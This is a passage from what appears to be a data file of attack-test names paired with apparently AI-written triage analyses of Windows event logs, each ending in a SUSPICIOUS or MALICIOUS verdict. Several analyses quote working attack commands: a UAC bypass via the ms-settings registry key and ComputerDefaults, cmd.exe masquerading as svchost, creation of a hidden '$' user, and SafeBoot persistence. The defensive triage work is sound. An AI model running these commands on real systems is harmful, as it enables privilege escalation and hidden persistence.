  - Audit PowerShell logs and configurations for any signs of abnormal or unauthorized activities.
  - Consider conducting endpoint scans for malware indicators and ensure that all systems are up to date with security patches."
Register-CimProvider - Execute evil dll,"After analyzing the provided logs from different sources, the following observations can be made:

1. **Sysmon Log:** There are multiple executions of processes like `powershell.exe`, `cmd.exe`, `conhost.exe`, `whoami.exe`, and `wevtutil.exe`. These processes themselves are not inherently malicious, but their execution origin and command-line arguments can indicate suspicious behavior.

2. **Process Executions:**
   - **PowerShell:** There is an instance where `powershell.exe` was executed. While PowerShell is a legitimate Windows component, it is frequently used by attackers due to its powerful scripting capabilities. However, there is no provided detail about the command-line arguments or script executed, which would typically help in classifying the activity in detail.
   - **Cmd and Register-CimProvider:** The logs show that `cmd.exe` was used to execute `Register-CimProvider.exe` with the path to a temporary DLL file. The tool `Register-CimProvider` is used to manage WMI providers, and executing it with a DLL from a temp location can be indicative of suspicious activity, possibly a sign of deploying a malicious component or misconfigured deployment.
   - **Utilities like `wevtutil` and `whoami`:** These utilities may be used for normal administrative purposes, but frequent and repetitive use in a short timeframe can suggest environment exploration or log manipulation.

3. **Edge Update Activities:**
   - There are multiple executions related to Microsoft Edge updates (`MicrosoftEdgeUpdate.exe` and related executables). These activities appear regular as part of system maintenance tasks.

4. **Application Log:**
   - Contains entries for Windows Defender being on, suggesting that the endpoint protection was active during these events. Logs also indicate activities from the `edgeupdate` service being stopped, which matches similar entries in Sysmon.

### Assessment:

- The execution of `Register-CimProvider.exe` from a temporary directory is atypical and may indicate an anomaly or misuse that could lead to unauthorized actions, potentially harmful. This event combined with the use of often abused utilities such as `cmd.exe` from PowerShell may warrant further investigation to determine the intent and origin of these activities.
- The Edge update related activities appear benign as part of regular updates, given there is no association with any malicious files or suspicious network activity.

### Guidance:

- Investigate the origin of the `Register-CimProvider.exe` execution: Examine the DLL mentioned in the path for malicious content or misconfigurations. Check if any unauthorized applications are attempting to register themselves as providers.
- Review the PowerShell execution details, especially the command-line arguments and associated scripts, if available, to determine if they are executing known administrative scripts or potentially malicious scripts.
- Ensure that Windows Defender or any endpoint protection is configured to monitor PowerShell and command-line activities more closely.
- Monitor for any further suspicious activity that aligns with tactics commonly used by adversaries who exploit PowerShell and WMI for persistence or lateral movement.

### Resolution:
**SUSPICIOUS** - The logs exhibit activities that do not immediately point to confirmed malicious activity, but, given the nature and typical usage scenarios, warrant further investigation to ensure the integrity and security of the system."
Abusing MyComputer Disk Cleanup Path for Persistence,"Upon reviewing the provided logs, the following suspicious behaviors and signs of potential compromise are noted:

1. **Registry Modification via `cmd.exe`:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\cleanuppath"" /t REG_EXPAND_SZ /d ""%%systemroot%%\system32\notepad.exe"" /f` executed by the user `SERVER002\admin_test` is concerning as it indicates a direct registry modification. Such actions can be used by attackers to set persistence mechanisms or modify system behavior for malicious purposes.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - We observe multiple executions of `wevtutil.exe` and `conhost.exe` in a short timeframe by the same user. While the use of `wevtutil.exe` alone might be legitimate for querying event logs, its frequent execution, followed by `conhost.exe`, could be indicative of log tampering or attempts to query or clear logs covertly.

3. **Elevation of Privileges and System Level Processes:**
   - The security logs show various logons with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.). While these privileges are often legitimate in a server environment, they can also be used for privilege escalation by an attacker if compromised.

4. **Use of High-Integrity Level Processes:**
   - Several processes executed with high integrity level, indicating powerful permissions that can be leveraged maliciously if the user account is compromised.

5. **Unexpected Execution of Built-in Utilities:**
   - Execution of `whoami.exe` and `hostname.exe` in rapid succession without apparent system administrator intent might indicate an attempt by an attacker to enumerate system information.

Based on the analysis of these logs, I recommend considering this activity as **SUSPICIOUS**. While some logs involve legitimate utilities and activities that might be necessary for server operations and maintenance, the combination of registry modifications, frequent back-to-back executions, and high-privilege actions suggest anomalous behavior that warrants further investigation.

**Guidance on how to proceed:**
- **Immediate Actions:**
  - Review access logs and user activities to confirm the legitimacy of the `admin_test` account's activities.
  - Investigate any recent changes in user permissions associated with `admin_test`.
  - Verify whether the registry modification is expected or part of legitimate maintenance activity.

- **Forensic Investigation:**
  - Conduct a full forensic analysis on `Server002` to determine the intent and impact of the registry modifications.
  - Check for any unauthorized software installations or alterations in the critical system files.

- **Long-term Monitoring:**
  - Increase logging verbosity for `Sysmon`, Security, and other key components to capture more contextual data.
  - Set up alerts for unusual process executions, especially those involving high-privilege accounts or system binaries. 

It's crucial to assess whether these activities align with recent changes or tasks assigned to IT personnel."
Disable Windows Remote Desktop Protocol,"### Detailed Analysis of Windows Event Logs

#### **Application Logs**
- The application logs predominantly show events related to the ""edgeupdate"" provider, indicating service stops. This could be part of routine updates by Microsoft Edge and does not immediately indicate malicious activity.

#### **Sysmon Logs**
- **Process Execution**: Analysis of the Sysmon logs reveals several executions of Windows system utilities such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe`. These are legitimate applications but could be used in a sequence that may indicate malicious activity (e.g., enumeration activities or log clearing).
  
- **Registry Modification Command**: The execution of `cmd.exe` to modify the registry key `HKLM\System\CurrentControlSet\Control\Terminal Server` with `fDenyTSConnections` to disable remote desktop connections is noteworthy. This action suggests a potential attempt to hinder remote management or access, which is a commonly observed behavior in threat scenarios where a malicious actor tries to obscure or halt remote monitoring/administration tools.

- **Microsoft Edge Update Executions**: There are numerous activities related to Microsoft Edge Update tools, which, without further context, could be part of legitimate updating processes. The processes `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` are executed several times, generally indicating normal behaviors unless paired with other suspicious activities.

#### **System Logs**
- The system logs include events showing time adjustments. Sudden changes to system time can indicate preemptive attempts to distort timestamp data on logs for log evasion. However, it is important to validate whether these changes are synchronized with a legitimate time service.

#### **Security Logs**
- The security logs also reported time change activities which align with system log entries. This can raise concern, as altering system time is a tactic used to manipulate log data.

### Assessment of the Situation

Based on the analysis:
1. **Suspicious Behavior Identified**:
   - The execution of a command to alter the Terminal Server settings to disable RDP might be an indicator of an attempt to limit remote investigation or remediation.
   - The system time alteration without clear evidence of legitimate synchronization actions could suggest attempts to mask reconnaissance or initial compromise activities.

2. **Indicators of Possible Malicious Activity**:
   - Changes to registry settings related to remote desktop configurations.
   - Concurrent system time adjustments that might be intended to disrupt legitimate log keeping.

### Resolution

The analysis indicates the presence of potentially anomalous and suspicious activity that warrants further investigation. Although typical Microsoft processes (like Edge updates) are behaving normally, the registry modifications and time adjustments suggest potential malicious intent.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions**:
   - **Confirm the legitimacy** of the registry modification and verify if authorized personnel executed the changes.
   - **Review account activity** associated with the `admin_test` user for any abnormalities preceding or following these events.

2. **Further Investigation**:
   - **Check for corresponding network logs** that might indicate external connections associated with the times of these activities.
   - **Correlate with other security solutions** (e.g., IDS, Antivirus logs) for signs of known threats or indicators of compromise around the same period.
   - **Monitor system behavior** in the following days for any escalation in suspicious activities.

Ultimately, collaboration with IT personnel to understand if the actions were part of authorized administrative tasks would be crucial. If not, consider isolating the system pending a thorough investigation to prevent potential threats."
Headless Browser Accessing Mockbin,"Based on the detailed analysis and examination of the provided event logs, I have identified the following points of interest:

1. **Time Manipulation Events:**
   - Events ID 4616, 1, 24, and 35 show system time changes which could be normal if there's an NTP synchronization happening. However, without proper context or if frequent, it might be a technique to avoid detection in logs.

2. **High Privilege Operations:**
   - Event IDs 4672 signify accounts being granted high-level privileges, such as `SeTakeOwnershipPrivilege` and `SeDebugPrivilege`. This is a concern if unexpected or performed outside regular administrative actions.

3. **Unusual Command Execution via PowerShell:**
   - Certain PowerShell commands (Event ID 600) with restrictive execution policies are unusual when executing commands like checking default install sections in INF files. It could indicate suspicious activities or attempts to enumerate systems for vulnerabilities.

4. **Process Creation and Command Line Analysis:**
   - For instance, Event ID 1 in Sysmon logs shows `cmd.exe` executing with parameters like `/c start """" chrome --headless ...`, which can be a legitimate, but also suspicious operation if unexpected use of headless browser mode is detected without a proper application.

5. **Multiple Unsuccessful Credential Access Attempts:**
   - Events ID 5379 indicate unsuccessful attempts to read credentials associated with a Microsoft service or account multiple times. Consistent failures indicate potential brute-force or misconfigured attempts.

6. **System Information Enumeration:**
   - Use of commands like `whoami.exe` (event ID 1) might not be anomalous depending on the user context but can be indicative of enumeration activity if carried out by unauthorized users.

7. **Network and Security Information:**
   - Details like Event ID 4624 show logons with type 3, which denote network logons and can be typical in various service-account interactions, yet if linked with privilege escalation or unexpected times, could warrant more scrutiny.

8. **Taskhostw Invocation:**
   - Events ID 4798 have frequent mentions of `taskhostw.exe`, which manages scheduled tasks. While common, running such processes under non-standard contexts warrants review, particularly when checking for scheduled tasks potentially leading to privilege escalations.

### Conclusion

Given the points above, the immediate threat isn't conclusively classified as malicious based on the log alone, but multiple elements indicate suspicious activities that demand further investigation to confirm or dismiss the presence of malicious intent. Specifically, the combination of privilege assignment, unusual PowerShell usage, unsuccessful credential attempts, and substantial process creation records inclines me to recommend further analysis.

**Final Assessment: SUSPICIOUS**

**Recommended Actions:**
- Verify the legitimacy of the privilege assignments and ensure these actions were authorized.
- Conduct a review of PowerShell logs and execution policies to identify unauthorized script executions.
- Validate time synchronization configurations and policies.
- Investigate the origin and purpose of unusual `cmd.exe` and PowerShell activities.
- Assess user accounts and network activities for unauthorized access attempts or policy violations.

This action will help clarify whether these events are benign or escalate to a potential security incident requiring mitigative actions."
Bypass UAC using ComputerDefaults (PowerShell),"Upon analyzing the provided logs, there are several points that stand out which indicate potential malicious activity:

1. **Windows PowerShell Log**: 
   - There is a PowerShell command being executed that manipulates registry entries to alter how certain system commands are executed. This specifically involves creating registry keys under `HKCU:\software\classes\ms-settings\shell\open\command`, setting `DelegateExecute` to an empty value, and changing the default command to open cmd.exe. This is a known technique used for UAC (User Account Control) bypass and could potentially allow unauthorized command execution with elevated privileges.
   
   Example suspicious command:
   ```powershell
   powershell.exe & {New-Item ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Force
   New-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""DelegateExecute"" -Value """" -Force
   Set-ItemProperty ""HKCU:\\software\\classes\\ms-settings\\shell\\open\\command"" -Name ""(default)"" -Value ""C:\\Windows\\System32\\cmd.exe"" -Force
   Start-Process ""C:\\Windows\\System32\\ComputerDefaults.exe""}
   ```

2. **Sysmon Log**: 
   - The repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` without any specific logs around these actions could suggest log clearing attempts or tampering, which is often associated with malicious behavior.
   - Execution of system binaries like `whoami.exe` and `hostname.exe` might indicate an attempt to gather system information, although this by itself might not be directly malicious unless used in conjunction with other actions.
   - There is evidence of PowerShell being used to run commands from a high integrity level, which could be associated with privilege escalation or system tampering.

3. **Security Log**:
   - The logs show a successful SYSTEM account logon (`EventID: 4624`) which is typical, but in the context of other registry and execution activities, this pattern could contribute to a privilege escalation attempt using the SYSTEM account.

4. **Anomalous Time Change**:
   - The logs show time adjustment actions. While time synchronization events are normal, any unexplained or unauthorized time change can interfere with log integrity which might be an attempt to obfuscate log timings in relation to certain actions.

**Assessment**:

Based on the analysis, the observed activity demonstrates a potential compromise scenario where there is a high likelihood of the system being manipulated using privilege escalation techniques (UAC bypass, registry tampering with PowerShell) and possible attempts at log tampering and system reconnaissance.

**Resolution**:

**MALICIOUS** - The activity in these logs, particularly the PowerShell command for UAC bypass and the nature of high-integrity level commands, strongly indicates malicious intent or compromise. Immediate action should be taken to further investigate the context of these activities, validate the integrity of other systems, and potentially isolate this machine for thorough forensic analysis."
Masquerading - windows exe running as different windows exe,"Upon careful analysis of the provided logs, I have identified certain events that might be indicative of suspicious activity warranting further investigation:

1. **PowerShell Activity:** There is a record of PowerShell execution (`PowerShell log`) with the command:
   ```powershell
   powershell.exe & {copy \""$env:ComSpec\"" ($env:TEMP + \""\\svchost.exe\""), $mydata_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\\svchost.exe\"")).Id, Stop-Process -ID $mydata_003}
   ```
   This command is notable because it creates a copy of the Windows Command Processor (cmd.exe) as ""svchost.exe"" in the Temp directory, executes it, and then immediately stops it. The use of PowerShell in this manner could be indicative of malicious activity, such as an attempt to evade detection by security software. It's atypical for a legitimate process to rename `cmd.exe` to `svchost.exe` and run it from the `%TEMP%` directory. This behavior is often associated with malware trying to disguise itself as a legitimate Windows process.

2. **Suspicious Process Executions:** In the `Sysmon log`, there are events showing the execution of `svchost.exe` from the `%TEMP%` directory, which does not match the typical legitimate `svchost.exe` locations (i.e., `C:\Windows\System32`). In particular, EventID 17954 and 17956 show the execution of a suspicious `svchost.exe` with a unique hash that doesn't align with the expected SHA-256 hash for a legitimate `svchost.exe` binary.

3. **Wevtutil Usage:** There are multiple instances where `wevtutil.exe` and `conhost.exe` are executed. Although `wevtutil.exe` is a legitimate utility used to retrieve information about event logs, frequent use in short intervals might suggest attempts to manage or clear logs as part of anti-forensics efforts.

4. **Windows Update and Security Logs:** The `System log` and `Security log` entries appear to be benign and related to normal operations such as Windows Updates and system checks.

Based on the analysis of these logs, I recommend the following actions:
- **Resolution: SUSPICIOUS** - The activities, especially involving the PowerShell script and the creation of an `svchost.exe` in the Temp folder, require further scrutiny.
- **Further Investigation:** Conduct a detailed investigation into the source of the PowerShell command and the purpose of creating and executing the `svchost.exe` file in the TEMP directory. 
- **Review Security Configurations:** Examine the security configurations for PowerShell logging and script execution policies to ensure they align with best practices.
- **Scan for Malicious Software:** Run a comprehensive malware scan on `Server002` to identify any other potentially harmful files or scripts that might be present.
- **Log Review and Real-time Monitoring:** Enable robust monitoring tools to detect and alert on unusual PowerShell activity and file execution from uncommon directories in real-time. 

The identified behavior is atypical enough to warrant caution and close attention to prevent any potential security incidents."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"After a thorough analysis of the provided Windows event logs, here is my detailed assessment:

### Summary of Findings

1. **PowerShell Activity:**
   - Multiple entries show the execution of PowerShell commands with `Invoke-CimMethod` to install an MSI package from a temporary location: 
     ```
     powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi' }}
     ```
   - Another PowerShell command is observed attempting to execute with the `-nop` (no profile) flag and a command that writes a message:
     ```
     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -Command Write-Host VBScript executed me!; exit
     ```
   - This suggests automation or scripted activity. The use of `-nop` and execution of VBScript might be indicative of obfuscation or an attempt to evade detection mechanisms.

2. **Sysmon Activity:**
   - There are logs showing system processes being executed, which in isolation do not reveal any definite malicious behavior (`hostname.exe` and `whoami.exe` running with normal parameters).
   - Multiple entries of `conhost.exe` and `wevtutil.exe` are observed, related to user actions by `SERVER002\\admin_test`. These too, under normal circumstances, could be benign.
   - Significant events of interest involve the execution of PowerShell with specific scripts and the process lineage observed which suggests command execution from an automated script or malware.

3. **Application Logs:**
   - The installation of the MSI file is successful (`MsiInstaller` event 11707), which is consistent with the PowerShell invocation.
   - The persistence of MSI installation activities in both PowerShell and application logs can reflect an installation framework but considering the temporary directory location, it raises suspicions regarding legitimate software installation.

### Assessment
Based on the analysis, the PowerShell commands originating from a temporary file location and containing script automation with `-nop` usage along with MSI execution, suggest suspicious activity. These activities are suspicious as they could potentially be leveraged for unauthorized software installation or malicious script execution typical of malware operations or unauthorized installations.

### Resolution
Given the current available data, I would classify this activity as **SUSPICIOUS**. This label indicates that, while there is no conclusive evidence of malicious intent, there is sufficient unusual behavior that deviates from standard user or system operations that warrants further investigation.

### Recommendations

1. **Immediate Action:**
   - Conduct a thorough examination of the `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\` directory to validate the contents of the `data.007_VBScript.msi`.
   - Isolate and analyze the MSI file in a sandbox environment to understand its purpose and ensure it does not perform unauthorized actions.
   - Review user activity logs for `admin_test` to check if these operations were intended or authorized.

2. **Long-term Monitoring:**
   - Implement enhanced monitoring for PowerShell usage, including logging all execution details and flags used.
   - Audit installations that originate from temporary directories to ascertain if they align with legitimate IT activities.

3. **Security Controls:**
   - Review and tighten security policies that apply to script execution and installation from non-standard directories.
   - Enable script block logging for better visibility into executed PowerShell code. 

Pursuing these actions will help ensure that potential threats are identified and thwarted, minimizing risk to the organization's IT environment."
UACME Bypass Method 23,"Upon analyzing the provided logs, several key points are worth mentioning:

1. **Cmd.exe Process Execution:** 
   - A command was executed using `cmd.exe` with the command line `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\23 Akagi64.exe`. This command derives the path to a file potentially used for dubious activities. The file name ""Akagi64.exe"" is suspicious, as it is known to be used in UAC (User Account Control) bypass techniques.
   - Another execution of `cmd.exe` was observed with the command `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\uacme\\23 Akagi64.exe""`, which indicates actual attempts to execute this file.

2. **Wevtutil.exe Execution:**
   - Multiple instances of `wevtutil.exe` were executed. This tool is typically used for managing and monitoring event logs in Windows. Frequent execution patterns, especially intertwined with suspicious activities, might indicate attempts to clear event logs to cover tracks.

3. **High Integrity Level:**
   - The execution of these commands under a high integrity level indicates that the user had administrative privileges, which could be leveraged in executing potential malicious activities.

4. **Edge Update Processes:**
   - Activities related to Microsoft Edge updates and installation processes are noted. These appear legitimate and consistent with regular system updates.

5. **Other Commands:**
   - The commands such as `HOSTNAME.EXE` and `whoami.exe` did not show any abnormal behavior and seem typical for administrative or diagnostic purposes.

**Assessment:**

The logs show potential indicators of malicious activities, primarily due to the suspected UAC bypass tool and usage of `wevtutil.exe`, which may reflect attempts to evade detection. The activity regarding UACMe (Akagi64.exe) specifically triggers concern, as it is a well-known tool for bypassing Windows User Account Control, commonly associated with malicious actors attempting privilege escalation or persistence on a system.

**Resolution: SUSPICIOUS**

These events are categorized as ""SUSPICIOUS"" and warrant further investigation. Recommended steps include:

- Inspect the file `Akagi64.exe` and related paths for malware presence or further evidence of malicious activity.
- Review user account activity (`SERVER002\\admin_test`) to verify if any unauthorized or unusual actions were performed.
- Monitor and audit administrative command execution and sysmon logs for other suspicious patterns.
- Consider isolating the affected system and conducting a comprehensive forensic investigation to prevent potential breaches or data exfiltration."
Create a Hidden User Called $,"Upon reviewing the given event logs, several points of interest potentially indicative of malicious activity have been identified:

### Indicators:
1. **Account Activity:**
   - Several security audit logs indicate user account creations and modifications within a very narrow time window (2024-10-28 12:58:08). Events such as 4720 (user account creation), 4724 (user account password reset), and 4732 (membership change) were rapidly executed.
   - The user `$` appeared to have been created and added to certain groups, likely with elevated privileges. The account name `$` is suspicious as it does not adhere to standard naming conventions.

2. **Processes and Commands:**
   - There is an execution of `cmd.exe` with command lines containing `net user $ file123! /add /active:yes`. This indicates an account creation operation via command line, possibly unauthorized, since the account creation is mirrored in the security logs.
   - There are repeated executions of legitimate Windows utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`) by `SERVER002\admin_test`. This could suggest possible reconnaissance or preparation for privilege escalation.

3. **Tools & Actions:**
   - The sequence of `net user` commands is typical of a script attempting to quickly create and enable a user account, which is a well-known pattern used in unauthorized access or lateral movement activities.
   - The process history, particularly around `wsmprovhost.exe` calling these tools, might indicate execution of a script or external command invoking these commands for configuration or persistent attempts.

### Assessment:
- Although the logs include usage of Windows utilities, the combination of user account manipulation, particularly involving suspicious user account naming (`$`), and command execution patterns are not typical for benign activity.
- The rapid sequence of events under the same logon session highlights a potential scripted or automated attempt at account manipulation, which is not common in standard logged administrative activities.

### Conclusion:
- **Resolution: SUSPICIOUS**: The activity indicates potentially unauthorized account creations and privilege manipulations that need immediate further investigation.

### Recommendations:
1. **Immediate Action**:
   - Alert IT operations to investigate the current status and access of the suspicious user account `$`. Temporarily disable or delete the account if deemed unauthorized.
   - Conduct a thorough review of `admin_test` actions within this time frame and verify the legitimacy of this account’s activity.
   
2. **System Monitoring**:
   - Increase monitoring on `Server002` and enhance logging for similar account and command activities across the network.
   
3. **Incident Response**:
   - If further evidence points to compromise, initiate full incident response procedures, which may include system isolation, in-depth forensic analysis, and reviewing recent network logs to trace potential lateral movements or additional unauthorized actions.

This analysis has identified concerning activities, and while certainty of maliciousness is not 100% established, the signs warrant further deep dive investigations to rule out compromise."
WinPwn - UAC Bypass DiskCleanup technique,"Based on the detailed log entries provided, here are the notable observations and analysis:

### Security Log
- **Event ID 4616**: This event is related to system time change, which can happen for legitimate reasons, such as system synchronization with a network time protocol (NTP) server. However, if an attacker changes system time, it can be used to manipulate time-sensitive processes or logs. Nothing in the context provided suggests the change is outright malicious, but it's a point of interest.

### Windows PowerShell Log
- The PowerShell logs contain multiple entries indicating the execution of potentially suspicious commands. 
- **`PowerShell.exe` executed with script**: The command is making use of Invoke-Expression (`iex`) to download and execute a script from a remote URL (`githubusercontent.com/S3cur3Th1sSh1t/WinPwn`), which indicates a download-execution pattern common in exploits or attacks.
- **`UACBypass`**: The command contains attempts to bypass User Account Control (UAC) using `DiskCleanup` as a technique, which is definitely suggestive of malicious intent or lateral movement typically associated with privilege escalation.

### System Log
- Mostly contains routine entries and time synchronization information from `time.windows.com`, reflecting normal behaviors and processes.

### Application Log
- Entries from Security Center and Software Protection Platform suggest active security measures, particularly Windows Defender being in an operational state, which can mitigate some malicious activities. 

### Sysmon Log
- Various processes are documented, including `wevtutil.exe`, `conhost.exe`, and `powershell.exe`. 
- **`PowerShell` Execution Indicator**: The entry for `powershell.exe` confirms that the command seen earlier in the PowerShell log was executed. This corroborates the occurrence of the potentially malicious PowerShell activity.
- **Execution of `whoami.exe` and `hostname.exe`**: These typically benign tools are used by administrators or scripts to gather environment information. However, their use in the context of suspicious PowerShell activity can indicate a step in reconnaissance or lateral movement.

### Conclusion
In reviewing the log entries:

- **Suspicious Activity**: The presence of PowerShell execution that downloads and runs a potentially malicious script indicates suspicious behavior. The inclusion of `UACBypass` reflects highly suspicious activity that warrants further investigation.
- **Indicators of Malicious Activity**: While some logs are routine, the PowerShell execution from a remote script is indicative of a possible compromise attempt.

### Resolution 
- **Classification**: **MALICIOUS** - The logs contain activity that clearly indicates an attempted or successful malicious compromise on the system.

### Recommendations
1. **Immediate Response**: Isolate the host from the network to prevent further lateral movement or data exfiltration.
2. **Detailed Forensic Analysis**: Conduct a deep analysis of the host for additional indicators of compromise (IOCs), including file integrity checks, registry changes, and more network activity scrutiny.
3. **Containment and Eradication**: Remove any malware found from the system, including the PowerShell scripts, and apply patches or security configurations to close any exploited vulnerabilities.
4. **Monitoring and Review**: Increase monitoring of similar activities across other networked systems and review security policies to prevent such activities in the future.

The findings highlight an active threat and necessitate urgent security measures to secure the environment."
Copy and Modify Mailbox Data on Windows,"### Detailed Analysis

Upon reviewing the provided event logs across various categories such as Application, PowerShell, Security, Sysmon, and System logs, several observations can be made:

#### Application Log
- The Application Log entry from the Software Protection Platform Service seems routine, involved with SPP rules engine. There is no indication of any unusual behavior or compromise from this singular log entry.

#### Windows PowerShell Log
- The PowerShell logs depict automated tasks involving file directory manipulation and content modification. The command executed:
  ```
  powershell.exe & {New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -File | ForEach-Object { Add-Content -Path $_.FullName -Value ""Modification for file Red Test"" -ErrorAction Ignore }}
  ```
  - This PowerShell activity, while extensive, does not immediately suggest malicious intent. The actions appear to be gathering and modifying files in a user's local directory.
  - However, without further context about this script’s origin or intended purpose, its legitimacy cannot be definitively confirmed. It could be a benign administrative task, or potentially, a part of automated data processing or testing.

#### Security Log
- The Security log entries indicate normal system operations. The time change logs reflect routine time synchronizations via svchost.exe, common in system time adjustments.

#### Sysmon Log
- Sysmon logs reveal multiple processes being run under the user `SERVER002\admin_test`. The processes include benign usage such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. 
- It's important to note the presence of `powershell.exe` commands executing the same PowerShell script noted in PowerShell logs:
  ```
  New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore ...
  ```
  - There is no evidence of privilege escalation, mismatched hash values, or anomalous parent-child process relationships in the logs provided.

#### System Log
- Similar to the Security log, the System log corroborates routine system tasks related to the synchronization and adjustment of system time. There are no significant alarms from this section of the logs.

### Assessment
- **Suspicious Activity**: The reoccurrence of the PowerShell script performing file operations, including copying and modifying local app data, raises some concerns. While this may be typical administrative scripting or part of routine file management/testing tasks on ""Server002"", it lacks clarity on its legitimacy since details on why these actions are performed are missing.

### Resolution
- **SUSPICIOUS**: The PowerShell activity's context concerning its intended goal is unclear. It's suggested to verify if these actions are intended and authorized by checking with IT administrators or the user responsible for `SERVER002\admin_test`.

### Guidance
1. **Further Investigation**: Proceed with further investigation to confirm the legitimacy of the PowerShell commands.
2. **Validate with Users/Admins**: Check with system administrators, or the user responsible, whether this activity is expected, potentially part of an automation script or scheduled task.
3. **Monitor and Alert**: Set up alerts for additional PowerShell command executions to catch recurrence or any deviation from expected operations.
4. **Review File System Changes**: Validate file manipulations in `C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy` directory to confirm no unauthorized data exfiltration or abnormal file changes occurred."
Windows Add Registry Value to Load Service in Safe Mode without Network,"Upon reviewing the series of event logs provided, here are the detailed observations and analyses for potential indicators of malicious activity:

### System Logs
- **Time Changes**: Multiple events show minor time adjustments handled by `svchost.exe`. This reflects Windows time synchronization and is common as an administrative task. No irregular time changes or discrepancies are present that would suggest tampering.

### Application Logs
- **Edge Update**: The log shows `edgeupdate` service stop activities, which is standard during update processes. The presence of Microsoft Edge updates being installed, adjusted, or manipulated does not inherently indicate malicious behavior as these updates often trigger similar logs in application logging.

### Sysmon Logs
- **Process Execution**:
  1. **Conhost and WEVTUTIL**: The execution of `conhost.exe` and `wevtutil.exe` by `SERVER002\admin_test` does not show any malicious activity on its own. These processes often relate to command-line and event log operations. No suspicious command-line arguments were provided that suggest misuse.
  2. **Use of CMD and REG.exe**: Particularly concerning is the use of `cmd.exe` to execute a registry modification with `reg.exe` regarding SafeBoot keys:
     - `""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""`: Register key manipulation for SafeBoot appears suspicious as it relates to system boot configuration. This type of activity could be indicative of an attempt to alter the boot configuration, potentially linked to persistence techniques.
  3. **Microsoft Edge Update**: Several logs indicate Microsoft Edge Update operations running under `NT AUTHORITY\SYSTEM`, which is typical for system-level background processes. The observed activities follow the expected pattern for software updating tasks and do not contain indicators of compromise.

### Security Logs
- **Time Synchronization**: Security-related events logged show alignment with system time corrections and regular operations by `svchost.exe`, which do not exhibit signs of tampering or unauthorized escalation.

### Assessment
- The logs generally demonstrate regular updates and time adjustments with expected services and processes, except for an anomalous registry modification command executed with high integrity that involves system boot configurations. This behavior suggests an unusual and potentially unauthorized action that should not typically occur in regular operational contexts without clear change documentation or approval.

### Conclusion
Based on the analysis, the following resolution is determined:
- **SUSPICIOUS**: The registry modification involving SafeBoot warrants further investigation. While it may be benign in isolated cases, it aligns with techniques sometimes used for malicious persistence or privilege escalation. Verification should be conducted with system administrators to confirm authorized actions relevant to this modification.

#### Recommended Actions
1. **Investigate Registry Modification**: Validate the legitimacy of the registry changes with relevant change management documentation or administrative personnel.
2. **User Activity Review**: Analyze the activities of `SERVER002\admin_test` around the event timeline for other irregularities or correlations with legitimate administrative tasks.
3. **Monitor Systems**: Increase monitoring on `Server002` for any further or similar unusual registry changes, command executions, or system configurations that could indicate misuse or attempts at unauthorized persistence.

Taking these steps will help to confirm the nature of the suspicious activity and ensure that no malicious actions have compromised the system’s integrity."
Copy and Delete Mailbox Data on Windows,"After analyzing the provided logs, I have identified several points of interest:

1. **Time Manipulation Events:** 
   - The `Microsoft-Windows-Kernel-General` and `Security` logs have multiple entries (Event ID 1 and Event ID 4616, respectively) indicating that the system time was modified. Legitimate reasons for time changes could include synchronization with an NTP server or manual adjustments by an administrator, but consistent resets may indicate an attempt to manipulate logging and cover tracks.

2. **PowerShell Activity:**
   - The Sysmon and Windows PowerShell logs show the execution of PowerShell scripts involving file manipulation in the `AppData\Local\Comms\Unistore\data` directory. This involves creating directories, copying files, and forcibly removing directories. Such behavior can be indicative of data staging for exfiltration or as part of lateral movement activity.

3. **Process Creation Events:**
   - Numerous instances of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) and its components running in rapid succession are logged in Sysmon. These events are relatively benign as they resemble legitimate software updating behavior. However, it is critical to verify these updates, especially when combined with other suspicious activities, such as frequent time changes or unauthorized PowerShell executions.
   
4. **Use of Administrative Account:**
   - The `wevtutil.exe` and `conhost.exe` processes executed by the `SERVER002\admin_test` account. While `wevtutil` is a legitimate Windows tool used to query event logs, its execution, combined with suspicious activities, could suggest log tampering or event log exports being used by a malicious actor with administrative access.

Given these observations, the logs merit further investigation due to:
- **Anomalous temporal modifications**: Frequent system time changes alongside potential attempts to circumvent typical log chronology.
- **Unauthorized PowerShell activities**: Possible attempts to establish persistence, move laterally, or manipulate data.

